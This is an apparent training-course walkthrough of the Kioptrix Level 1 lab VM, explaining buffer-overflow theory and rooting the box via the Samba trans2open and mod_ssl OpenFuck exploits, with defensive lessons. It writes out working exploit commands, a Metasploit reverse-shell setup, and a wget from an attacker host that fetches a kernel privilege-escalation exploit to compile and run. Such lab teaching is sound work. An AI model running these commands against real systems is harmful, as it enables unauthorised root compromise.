# Machine 5 — Kioptrix: Level 1 (#1)

> **Position:** 5 of 13 · the first **Band 3** box · **Band 3 — Easy** (global rank **046** of 708)
> **Full writeup:** [`labs/3-046-kioptrix-level-1-1/README.md`](../../labs/3-046-kioptrix-level-1-1/README.md)

| | |
| --- | --- |
| **Machine** | Kioptrix: Level 1 (#1) |
| **Author** | loneferret |
| **Released** | 17 February 2010 |
| **Target OS** | Red Hat Linux 7.2 — Apache **1.3.20** + mod_ssl **2.8.4** + OpenSSL **0.9.6b**, Samba **2.2.1a**, OpenSSH **2.9p2** |
| **VulnHub** | [entry/kioptrix-level-1-1,22](https://vulnhub.com/entry/kioptrix-level-1-1,22/) |
| **Objective** | root (no flag file; the proof is the root shell + `/var/mail/root`) |
| **Estimated time** | 4–6 hours |

> ⚠️ **Verification note (metadata).** The VulnHub entry confirms the name and the release date (**17 Feb 2010**) exactly as listed above, but names the author only as *Kioptrix* (the series). The value **loneferret** in the table could not be confirmed from VulnHub's own field — treat the author as "the Kioptrix team" until you find a primary source. Note also that 2010 is the **release date of the image**, while the software stack inside is 2001–2003 vintage (kernel `2.4.7-10`, built September 2001 — see Step 6).

> **Snapshot the VM before you start.** This machine is from 2002; a failed overflow can panic it. That is part of the lesson, not an obstacle.

---

## How to use this card

Same template: **A** (method + theory) · **B** (the machine) · **C** (every command, logically). The new theory here: **legacy services**, **what a buffer overflow is (conceptually)**, **what a target offset is**, **shells and payloads (reverse vs. bind, single vs. staged)**, and **exploit build engineering**. Every step in Part C ends with a **Trap** (beginner mistake) and a **Defensive lesson** (what a blue teamer should take from it).

---

# Part A — The method (theory)

## A.1 The new skill: exploiting **legacy infrastructure**

Every machine so far had a modern web application. Kioptrix has **none** of that: it is a pile of **ancient network services**. It teaches a discipline the modern boxes cannot:

> **Get an *exact* version string, find the right published exploit for *that* version *and* that architecture *and* that distribution, and make 20-year-old exploit code actually compile and run.**

That is what exploiting legacy infrastructure looks like in practice — mostly **build engineering**, not cleverness.

## A.2 Why the *exact* version matters more than "old"

The difference between `Samba 2.2.1a` and `Samba 2.2.8` is worth **more** than the difference between `Samba 2.2` and `Samba 4.x`. Why? Because an exploit has a **version range** — here `2.2.0 < 2.2.8`. If your box is 2.2.1a, you are **inside**. If it is 2.2.9, you are **outside**. `-sV` is what gives you the exact version — which is why you write down **every** version string.

## A.3 What a buffer overflow is — conceptually

A program reserves a **fixed** amount of space for input. If you send **more** than fits, the extra bytes are written **past** that space — over neighbouring data that determines **what the program does next**. By controlling the extra bytes, you control the next action.

**In one sentence without the word "memory":** you send a program more data than it expected, and the excess changes what it does next.

On a **network service** running as **root** (like Samba here), an overflow gives **root directly** — no separate privilege-escalation stage.

## A.4 The "target offset", and why the distribution matters

To "change the next action", you must send a **specific address** at the right position. That address depends on **where** the program is loaded — which depends on the **distribution** and package **version**. That is why `(Red-Hat/Linux)` in the banner is **not decoration**: the exploit has a table of **target codes**, and you must pick the matching one (here `0x6b` = Red Hat 7.2). Wrong offset = overflow at the wrong place = **the service crashes**.

## A.5 Shells and payloads — four words people confuse

- **Reverse shell:** the target connects **out** to a port *you* listen on. Works through NAT; fails if the target cannot reach your IP.
- **Bind shell:** the target opens a port and **waits**; you connect to it. Fails through NAT and when inbound connections are filtered.
- **Single (inline) payload:** the whole shell arrives in **one** piece — bigger, self-contained, reliable.
- **Staged payload:** a tiny **stager** goes in first, then downloads the rest (the **stage**, e.g. Meterpreter). Smaller, but that second transfer must succeed — on this fragile 2002 box it often does not, and sessions die immediately (Part C, Step 3).

## A.6 The principle: banner suppression is **not** patching

Hiding `Server: Apache/1.3.20` makes an attacker's job harder, **but the vulnerability remains** and remains exploitable. Only **removing or updating** the software fixes it.

---

# Part B — The machine

## B.1 What you will learn

1. Enumerate **non-web services** properly: SMB/NetBIOS, `rpcbind`, ancient SSH.
2. Extract **exact version strings** from banners — and why `2.2.1a` ≠ `2.2.8`.
3. Use **`searchsploit`** as a research tool (`-t`, `-m`, `-x`, `-p`).
4. Understand **what a remote buffer overflow is**, conceptually.
5. Drive Metasploit against a legacy target: **target offset** + **payload architecture**.
6. **Compile an old exploit** and cope with modern-toolchain friction.
7. Accept that a legacy box may **crash**, and use snapshots accordingly.
8. Compare **two independent routes** to root.

## B.2 The map (2 routes, direct root)

| | Route | The essence | Result |
| --- | --- | --- | --- |
| **A** | Samba `trans2open`, **CVE-2003-0201** | overflow in a service running as root | **root directly** |
| **B** | Apache mod_ssl "**OpenFuck**", **CVE-2002-0082** | SSLv2 overflow | often `apache` → needs more |

Both routes are real and independent. A is the community consensus (fastest, no compilation). B is the "web side" of the box and drags you through **compile engineering + a local privilege escalation** — which is exactly why it is educational.

## B.3 Before you start

- [03 — Service and Network Attacks](../03-Service-and-Network-Attacks.md) **§2** (SMB) and **§5** (legacy services).
- [01 — Foundations](../01-Foundations-Networking-and-Recon.md) §5–§6 (reading banners, what `-sV` does).
- [00 — Before You Start](../00-Before-You-Start.md) — **snapshot before you start.**

**Answer before:**
1. Why is the difference `2.2.1a`/`2.2.8` worth more than `2.2`/`4.x`?
2. What does a buffer overflow do, in one sentence without the word "memory"?
3. What is a **target offset**, and why does the target's distribution matter?
4. Why might an exploit for a 32-bit x86 host fail on your 64-bit Kali?
5. Which is riskier on a live VM — a remote or a local overflow? Why?

---

# Part C — The walkthrough, step by step

## Step 1 — The scan, and why every version string matters

**Why this step.** You cannot choose an exploit without knowing *exactly* what is running. If you do not know the target's IP yet, discover it first: `sudo arp-scan -l` (or `netdiscover`) — Marcin Lachowicz's and Volta Security's writeups both start there.

```bash
sudo nmap -sC -sV -p- -T3 -oA scans/kioptrix TARGET
```

**Flags.** `-sC` runs nmap's default scripts (cheap extra facts, e.g. the NetBIOS name), `-sV` probes every open port for its **version string** — the single most important flag on this box, `-p-` scans all 65 535 TCP ports instead of the top 1000, `-T3` is *normal* timing, and `-oA scans/kioptrix` saves the result in three formats (`.nmap`, `.gnmap`, `.xml`) — note the `scans/` directory must already exist (`mkdir -p scans`), otherwise nmap refuses.

**Why `-T3` and not `-T4`:** this stack is from 2002; aggressive timing can make it **drop** connections, which nmap then reports as "port closed" — a false negative you would chase for an hour.

```text
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp   open  http        Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
1024/tcp open  status      1 (RPC #100024)
```

**How to read it.**
- Port 80 is a **software bill of materials**: `Apache 1.3.20` on `Unix (Red-Hat/Linux)` with `mod_ssl/2.8.4` and `OpenSSL/0.9.6b`. **That exact triple is the target selector for OpenFuck**, and `(Red-Hat/Linux)` is not decoration (Part A.4).
- `OpenSSH 2.9p2 (protocol 1.99)` means it speaks **SSH protocol 1**, which is cryptographically broken — a finding regardless of what else you achieve.
- Port 139 says `Samba smbd` but shows **no version** — banners can lie by *omission* too.
- `111` (`rpcbind`) and `1024` (`rpc.statd`) are old RPC plumbing exposed for no good reason.

**Trap.** nmap's version column is a *probe result*, not gospel. Where a version decides everything (Samba's exploit range does), **confirm it with the service itself** — Step 2.

**Defensive lesson.** Version banners are free reconnaissance for attackers; the fix starts by not running 20-year-old services, not by hiding the banner (Part A.6).

## Step 2 — Fingerprint Samba exactly, then research every version

**Why this step.** The 139 line gave no version, and the exploit range `2.2.0 < 2.2.8` is unforgiving. Samba will tell you its version if you ask politely — this is an **anonymous** login, which is itself a finding:

```bash
nmblookup -A TARGET          # the NetBIOS name (nmap's nbstat script shows it too: KIOPTRIX)
smbclient -L \\KIOPTRIX -I TARGET -N
```

**Flags.** `nmblookup -A` asks the host for its NetBIOS names; `smbclient -L` **lists** shares on the host, `-I` targets its IP, `-N` skips the password prompt.

```text
Anonymous login successful
Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
```

**How to read it.** `Server=[Samba 2.2.1a]` — the number you needed. (Metasploit's `auxiliary/scanner/smb/smb_version` prints the same fact: `Host could not be identified: Unix (Samba 2.2.1a)`. Every writeup converges on **2.2.1a**.) Note the anonymous login and the shares `IPC$`/`ADMIN$` — unauthenticated enumeration worked.

Now research. **Write down all versions and search each; do not pick an exploit yet:**

```bash
searchsploit -t samba 2.2
searchsploit -m linux/remote/10.c
less linux/remote/10.c
```

**Flags.** `-t` restricts matches to the exploit **title** (by default searchsploit also matches file *paths*, which drags in noise from unrelated `osx/remote` entries); `-m` **mirrors** (copies) the entry into your current directory; **`less` before compiling is mandatory** — you are looking for the target table, the required flags and what success looks like.

```text
 Samba 2.2.0 < 2.2.8 (Linux/BSD) - Remote Code Execution  | linux/remote/10.c
 Samba 2.2.x - 'trans2open' Remote Buffer Overflow        | linux/remote/22.c
```

**How to read it.** The range `2.2.0 < 2.2.8` includes the `2.2.1a` we found. `linux/remote/` means platform-specific and works over the network with no prior access. This is **CVE-2003-0201**: an overflow in Samba's handling of SMB **transaction-2** requests (`trans2open`) — a crafted packet overwrites what `smbd` does next. Because `smbd` forks a new process **as root** for every connection, "what it does next" can be "run your shellcode as root". Paths vary between searchsploit versions — see the ⚠️ exploit-ID note in Part G.

**Trap.** Do not grab the first result whose title looks close: `linux/remote/7701.txt` (Samba < 3.0.20 heap overflow) and the DoS entries match the same search but solve a different problem.

**Defensive lesson.** Exact version + published CVE = one-line exploit lookup. Unauthenticated, network-reachable SMB turns that line into a root shell.

## Step 3 — Route A: Metasploit (direct root)

**Theory first.** The module overflows `smbd` and must jump to shellcode that matches the **target architecture**: this VM is **32-bit x86** (its `uname` output ends in `i686` — see Step 6), so an `x64` payload would crash it. Second, payload *style* matters: Metasploit's default here is `linux/x86/meterpreter/reverse_tcp`, a **staged** payload — on Kioptrix the sessions open and instantly die (`Meterpreter session 1 closed. Reason: Died`). That is Part A.5 in real life; the fix is the **single** (non-staged) shell payload.

```bash
msfconsole -q
msf6 > use exploit/linux/samba/trans2open
msf6 exploit(trans2open) > info
msf6 exploit(trans2open) > set RHOSTS TARGET
msf6 exploit(trans2open) > set LHOST 192.168.56.10
msf6 exploit(trans2open) > set PAYLOAD linux/x86/shell_reverse_tcp
msf6 exploit(trans2open) > show targets
msf6 exploit(trans2open) > run
```

**Commands explained.** `-q` skips the banner; `info` reads the module's own documentation — always do this, it names the CVE, the affected range and the targets. `RHOSTS` is the victim; `LHOST` is **your** IP as seen *by the victim* — the host-only/bridged one, never your Wi-Fi address. `PAYLOAD linux/x86/shell_reverse_tcp` is the **single, 32-bit, reverse** shell (target connects back to you on port 4444). `show targets` reveals the offset strategy: here a single target called **`Samba 2.2.x - Bruteforce`** — the module walks candidate return addresses because stack addresses vary between builds.

```text
[*] Started reverse TCP handler on 192.168.56.10:4444
[*] 192.168.56.101:139 - Trying return address 0xbffffb78...
[*] 192.168.56.101:139 - Trying return address 0xbffffa78...
[*] Command shell session 1 opened (192.168.56.10:4444 -> 192.168.56.101:1045)

id
uid=0(root) gid=0(root) groups=99(nobody)
```

**How to read it.** Each line reading `Trying return address 0xbffffb78...` is one failed candidate — several are normal; **one** hit opens the session. Samba ran as **root**, so the overflow gives **root directly** — **there is no privilege-escalation stage on this box.** `groups=99(nobody)` is a leftover of the daemon's supplementary groups and does **not** reduce your authority; `uid=0` is decisive. Now type `bash -i`: the raw payload shell is non-interactive (no prompts, no job control) and `bash -i` gives you a usable one.

**Traps.**
- Failure #1: `LHOST` was your Wi-Fi IP instead of the host-only one.
- Failure #2: you already ran `-T4` and destabilised the service — check the VM console.
- Failure #3: the VM crashed — restore the snapshot.
- The brute force keeps trying after the first success, so **multiple sessions** may open; stale ones die. Use the newest working one.

**Defensive lesson.** One unauthenticated protocol reachable from the network was enough for instant root. Segment file-sharing networks and disable services you do not need.

## Step 4 — Route A, manual: compiling the 2003-era Samba exploit

**Why this step.** Metasploit hides the machinery; doing it by hand shows what the module actually did — and teaches the **build engineering** of Part A.1. EDB-10 (`Samba < 2.2.8 (Linux/BSD) - Remote Code Execution` by eSDee, 2003, CVE-2003-0201) is a single C file.

```bash
searchsploit -p 10          # where does EDB-ID 10 live on YOUR install?
searchsploit -m 10          # mirror it into the current directory
less 10.c
gcc -o samba10 10.c
./samba10 -b 0 TARGET
```

**Flags.** `-p 10` prints the file path for an EDB-ID (paths differ between archive versions — this is why you match on the **EDB-ID**); `-m 10` copies the file for you. In the exploit itself, `-b 0` means **bruteforce return addresses for platform `0 = Linux`** (its usage text lists `0 = Linux, 1 = FreeBSD/NetBSD, 2/3 = OpenBSD`), and the last argument is simply the target host. Run `./samba10` with no arguments to see the full option list (`-t` presets, `-v` verbose, `-c` connect-back IP, `-p` port).

**How it gets you a shell.** EDB-10 is a **bind-shell** exploit: the shellcode opens **port 45295** on the victim and the tool connects to it *for you* — you do not run a listener.

```text
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
+ Bruteforce mode. (Linux)
+ Using ret: [0xbffffed4]
+ Worked!
--------------------------------------------------------------
    uid=0(root) gid=0(root) groups=99(nobody)
```

**How to read it.** `+ Worked!` means one return address landed; the tool then prints the victim's `id` — again `uid=0`, again that harmless `groups=99(nobody)`.

**Compile friction — the lesson, not an obstacle.** Expect, on a modern toolchain: implicit-declaration warnings (2003 code relied on headers that no longer imply each other — `bzero` is the classic), undefined references to functions removed from modern libc, and sometimes a need for 32-bit build support (`gcc -m32`, plus the `gcc-multilib` package). **Whoever makes a 20-year-old `.c` compile owns the box.**

**Trap.** `-b` bruteforces blindly: the wrong platform index (`-b 1`) or a previously crashed `-T4`-destabilised `smbd` yields `+ Exploit failed` — re-check, and remember the snapshot.

**Defensive lesson.** Same CVE as route A, now as raw code you had to fix yourself: the only real fix is still upgrading Samba. The exploit's 20+ year survival is why "we'll patch it later" fails.

## Step 5 — The alternative: OpenFuck (mod_ssl) and its local privesc

**Theory first.** Port 443 speaks **SSLv2** (nmap's script output shows `sslv2: SSLv2 supported`, plus a pile of broken export ciphers), and `mod_ssl 2.8.4` is below 2.8.7, which has a buffer overflow in the SSLv2 handshake — **CVE-2002-0082**, EDB-764 "OpenFuckV2". The exploit needs three things from you: the right **target code** (Part A.4), a **compile that works on a 2020s toolchain**, and a plan for **what your shell will actually be**.

```bash
searchsploit apache mod_ssl
searchsploit -m 764              # or 47080 — the "(2)" update of the same exploit
sudo apt install libssl-dev      # without it: "openssl/ssl.h: No such file or directory"
gcc -o openfuck 764.c -lcrypto
./openfuck                       # prints the full target table
./openfuck 0x6b TARGET 443 -c 40
```

**Flags.** `-lcrypto` links against OpenSSL's library (the code implements the SSLv2 handshake itself). `0x6b` is the **target code** — you must pick the entry matching Apache 1.3.20 + mod_ssl 2.8.4 + OpenSSL 0.9.6b **on Red Hat 7.2**: the table contains both `0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1` and `0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2`, and rastating's and kongwenbin's writeups both report **`0x6a` failed, `0x6b` worked**. A wrong code overflows the wrong offset and crashes httpd. `-c 40` opens 40 connections first — the exploit's own usage says *"use range 40-50 if u dont know"*. The port argument is optional (default 443).

```text
Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f81c8
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$
```

**How to read it — and what people get wrong here.** **Run `id` before you celebrate.** This box's `/etc/passwd` contains `apache:x:48:48:Apache:/var/www:/bin/false`, and the SSL worker you hijacked runs as that unprivileged user — most writeups land in `bash-2.05$` as **`uid=48(apache)`**, not root. The exploit *knows* that: it immediately runs its built-in escalation, which on this machine's kernel targets the famous **ptrace/kmod** local root bug.

**Trap — the built-in escalation relies on a dead download.** The command it runs fetches `http://packetstormsecurity.nl/0304-exploits/ptrace-kmod.c`, compiles it to `p` and executes it. In rastating's transcript you can read `packetstormsecurity.nl: Host not found.` — you stay `apache`. Some writeups report that download still resolving through a mirror and landing root automatically — **do not count on it; check `id`.**

**Manual escalation when it fails (rastating's chain):**

```bash
# on your box: fetch EDB-3, the ptrace/kmod local root exploit
# (https://www.exploit-db.com/exploits/3/), save it as ptrace.c, then:
sed -i 's|linux/user.h|sys/user.h|' ptrace.c   # the old header no longer exists
python3 -m http.server 9090                    # 2017 writeups used: python -m SimpleHTTPServer 9090
# back in your apache shell on the target:
wget http://ATTACKER:9090/ptrace.c
gcc -o ptrace ptrace.c && ./ptrace
whoami
root
```

**How to read it.** The local exploit abuses how this 2.4.x kernel handles **ptrace**; on success you see `[+] Now wait for suid shell...` and then `root`. Some writeups also need `libssl1.0-dev` (or the maintained OpenFuck fork "OpenLuck") to compile 764 at all, and others report a small pile of further compile fixes; the pattern is always the same: **read the compiler, patch the header, rebuild.**

**Defensive lesson.** Two compounding, decades-old failures (one remote overflow, one local kernel bug) removed this host. Patch management would have eliminated either one; left unpatched *and* chained, they eliminate the whole machine.

## Step 6 — Confirming and reporting

```bash
find / -name '*flag*' -type f 2>/dev/null | head -15
cat /etc/redhat-release
rpm -qa | grep -iE 'samba|apache|openssl' | sort
uname -a
cat /var/mail/root
```

```text
Red Hat Linux release 7.2 (Enigma)
samba-2.2.1a-4
apache-1.3.20-16
openssl-0.9.6b-4
```

**How to read it.** `/etc/redhat-release` names the distribution; **`rpm -qa`** lists **every** installed package with exact versions — the authoritative evidence for your report, better than a banner; `uname -a` confirms the `2.4.7-10` kernel on an `i686` (32-bit) CPU — revisit Step 3's payload choice. Kioptrix has **no flag file**: the objective is the root shell, and the proof is the `id` output plus the `/root` listing (+ `/var/mail/root`, which most writeups treat as the "flag" — 7h3rAm's walkthrough ends with `cat /var/mail/root`). As loot, `/etc/shadow` holds the three crackable hashes (`root`, `john`, `harold`).

**Defensive lesson.** Record package versions from the *system*, not the banner: that is what your remediation list is built from — and it is also what an attacker writes down first.

---

# Part D — Defensive lessons

| Finding | Fix |
| --- | --- |
| Samba 2.2.1a with `trans2open` | **Replace the software.** No configuration fixes a 2003 remote-root overflow |
| Apache 1.3.20 + mod_ssl 2.8.4 | Upgrade. Apache 1.3 has been EOL since 2010 |
| OpenSSL 0.9.6b | Upgrade — predates essentially every modern TLS control |
| OpenSSH 2.9p2, protocol 1.99 | Upgrade; set `Protocol 2`; disable weak ciphers and DSA |
| SMBv1 / NetBIOS exposed | Disable SMBv1; block 139/445 at the perimeter |
| `rpcbind` + `rpc.statd` exposed | Bind to localhost or firewall it; historic RPC services have been exploited for decades |
| No patch management at all | The root cause. Schedule vulnerability scanning with version detection |
| Default test page, HTTP `TRACE`, Webalizer 2.01, anonymous SMB shares | Remove default content, disable TRACE, upgrade add-ons, require authentication — every one of these is free recon (Nikto's noisy list on this box shows how much) |

**The single biggest lesson:** *banner suppression is not patching.* Only removing or updating the software fixes it.

---

# Part E — Review questions

1. Which route did you use, and what did the **other** teach you that yours did not?
2. Why did the exploit give root directly here, while Machines 1–4 needed a separate escalation?
3. What exactly did you have to change in the exploit before it worked? List each parameter and why.
4. Did the box crash at any point? What did that teach you about snapshotting?
5. SMBv1 is enabled. Independent of the overflow, why is that a finding?
6. If a client showed you this exact stack today, what would your **first** recommendation be — and why is "patch Samba" not sufficient?

---

# Part F — Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

Run a full scan with versions and default scripts. Write down **every** version string. Then, for each one, run `searchsploit` — without picking an exploit yet. One service is dramatically older than the others and has a famous remote-root bug.
</details>

<details>
<summary><strong>Rung 2 — which service</strong></summary>

22 (OpenSSH 2.9p2), 80 (Apache 1.3.20 / mod_ssl 2.8.4 / OpenSSL 0.9.6b), 111, 139/445 (**Samba** — nmap shows no version, so ask it: `smbclient -L \\KIOPTRIX -I TARGET -N` → **2.2.1a**). `searchsploit -t samba 2.2` → **trans2open, CVE-2003-0201**. Alternative: **OpenFuck**, CVE-2002-0082.
</details>

<details>
<summary><strong>Rung 3 — the Samba route via Metasploit</strong></summary>

`use exploit/linux/samba/trans2open` → `info` → `set RHOSTS`, `set LHOST` (the **host-only** IP), `set PAYLOAD linux/x86/shell_reverse_tcp` (single, non-staged — the default Meterpreter dies) → `run`. If it fails: `LHOST`, offset, or a crash (snapshot).
</details>

<details>
<summary><strong>Rung 4 — manual and OpenFuck</strong></summary>

`searchsploit -m 10` → read → `gcc -o samba10 10.c` → `./samba10 -b 0 TARGET` (expect compile friction; it bind-shells you on port 45295). OpenFuck: `gcc 764.c -o openfuck -lcrypto` → `./openfuck 0x6b TARGET 443 -c 40` → often `apache`, not root → its automatic ptrace download is dead → EDB-3 + the `linux/user.h` → `sys/user.h` patch.
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap -sC -sV -p-` → 22, 80, 111, 139, 443, 1024. 2. `smbclient -L` → Samba **2.2.1a**; `searchsploit -t samba 2.2` → **trans2open** (CVE-2003-0201). 3. Metasploit `trans2open` + `linux/x86/shell_reverse_tcp` → **root directly**. 4. `id` → `uid=0`. 5. Alternatively **OpenFuck** (`0x6b`) → `apache` first, then ptrace → root.
</details>

---

# Part G — References

- **VulnHub entry:** <https://vulnhub.com/entry/kioptrix-level-1-1,22/>
- **English lab:** [`labs/3-046-kioptrix-level-1-1/README.md`](../../labs/3-046-kioptrix-level-1-1/README.md)
- **Greek mirror of this card:** [`Μηχανές/05-kioptrix-level-1-1.md`](../../Μαθησιακή%20Διαδρομή%201%20-%20Εισαγωγή%20στην%20Κυβερνοασφάλεια/Μηχανές/05-kioptrix-level-1-1.md)
- **Cross-checked writeups** (confirm Red Hat 7.2, Samba 2.2.1a, OpenFuck 0x6b):
  - [rastating — Kioptrix Level 1](https://rastating.github.io/kioptrix-level-1-ctf-walkthrough/)
  - [7h3rAm — Kioptrix Level 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix1/writeup.md)
  - [Exploit-DB 764 — OpenFuck](https://www.exploit-db.com/exploits/764)

- **Community notes — consensus, pitfalls and alternative routes** (cross-checked against the sources below):
  - **Consensus chain:** `22/80/111/139/443/1024` → Samba 2.2.1a → `trans2open` (CVE-2003-0201) → root directly; proof is `id` plus `cat /var/mail/root` (there is no flag file).
  - **Fingerprinting consensus:** nmap alone shows no Samba version — writeups obtain `2.2.1a` from `smbclient -L` with `-N` (rastating), Metasploit's `auxiliary/scanner/smb/smb_version` (Lachowicz) or `nmblookup -A`; all agree on **2.2.1a**.
  - **Common pitfall:** the module's default Meterpreter payload opens sessions that immediately die — switch to the non-staged `linux/x86/shell_reverse_tcp` for a stable shell (the staged/stage distinction is explained in Part A.5).
  - **Common pitfall:** the return-address brute force may open **several** shell sessions; the stale ones die — use the newest.
  - **Common pitfall:** this 2002-era stack crashes under aggressive scanning — snapshot the VM and prefer `-T3`.
  - **Alternative route:** OpenFuck (mod_ssl CVE-2002-0082, EDB-764/47080) at `0x6b`/`0x6a` usually returns a shell as `apache` (uid 48); its built-in `ptrace-kmod.c` download is dead, so fetch EDB-3 and compile it yourself (patch `linux/user.h` → `sys/user.h`). rastating's transcript shows `Host not found`; other writeups report the mirror `dl.packetstormsecurity.net` still answering — treat it as unreliable and verify with `id`.
  - **Alternative route:** fully manual Samba path — `searchsploit -m multiple/remote/10.c`, then `./10 -b 0 <target>` (EDB-10 bind-shells you on **port 45295**; `-b 0` = Linux bruteforce — from the exploit's own usage text).
  - **Compile-friction consensus:** `764.c` needs `libssl-dev` (missing header error), and on newer Kali some writers also need `libssl1.0-dev` plus the "Updating OpenFuck" patch, or the maintained **OpenLuck** fork — all report the same end state: shell as `apache`, then ptrace.
  - ⚠️ **Verification note (exploit IDs):** every `trans2open` exploit carries **CVE-2003-0201** — confirmed on [EDB-7](https://www.exploit-db.com/exploits/7) (H D Moore's `trans2root.pl`, reverse shell) *and* [EDB-10](https://www.exploit-db.com/exploits/10) (eSDee, bind shell) — while writeups variously cite `10.c`, `22.c`, `7` or `22468`–`22471` for the "same" bug. OpenFuck is **CVE-2002-0082** in both of its Exploit-DB versions: [EDB-764](https://www.exploit-db.com/exploits/764) ("(1)") and [EDB-47080](https://www.exploit-db.com/exploits/47080) ("(2)"). Match on **CVE + version range + EDB-ID**, never on the searchsploit path alone.
  - ⚠️ **Verification note (searchsploit paths):** the path for EDB-10 appears as `multiple/remote/10.c`, `linux/remote/10.c` and `unix/remote/10.c` in different Exploit-DB archive generations — all three names point at the same file. Use `searchsploit -p <EDB-ID>` to find yours, or mirror directly with `-m <EDB-ID>`.
  - ⚠️ **Verification note (impostor writeups):** search results labelled "Kioptrix Level 1" occasionally describe a *different* machine (Apache 2.0.52 on CentOS, MySQL, a login form with SQL injection). This VM's confirmed stack is the Red Hat 7.2 / Apache 1.3.20 / Samba 2.2.1a one in the table above — if a writeup shows a login page or MySQL, it is not this box.
  - **Verified sources:** [rastating](https://rastating.github.io/kioptrix-level-1-ctf-walkthrough/) (the current live replacement for older dead writeup links) · [7h3rAm (GitHub)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix1/writeup.md) · [Marcin Lachowicz](https://mlachowicz.github.io/Kioptrix-1) · [EDB-764](https://www.exploit-db.com/exploits/764) · [EDB-10](https://www.exploit-db.com/exploits/10) · [EDB-7](https://www.exploit-db.com/exploits/7) · [VulnHub entry (release metadata + walkthrough index)](https://vulnhub.com/entry/kioptrix-level-1-1,22/)

---

# Part H — If you get completely stuck

- **Snapshot first.** This box crashes.
- Verify connectivity: `ping TARGET`, `ip -br a`.
- If Metasploit fails, try `linux/x86/shell_bind_tcp` (if the reverse cannot get out through NAT).
- Offset trouble? Run each exploit **without arguments** first — `./openfuck` prints every supported `0xNN` target code, `./samba10` prints its option list.
- Check [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and [`docs/TOOLS.md`](../../docs/TOOLS.md).
- Revert the snapshot and redo from memory.

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 4 — DC: 2](04-dc-2.md) · next: [Machine 6 — bossplayersCTF: 1](06-bossplayersctf-1.md) · full writeup: [`labs/3-046-kioptrix-level-1-1`](../../labs/3-046-kioptrix-level-1-1/README.md)._
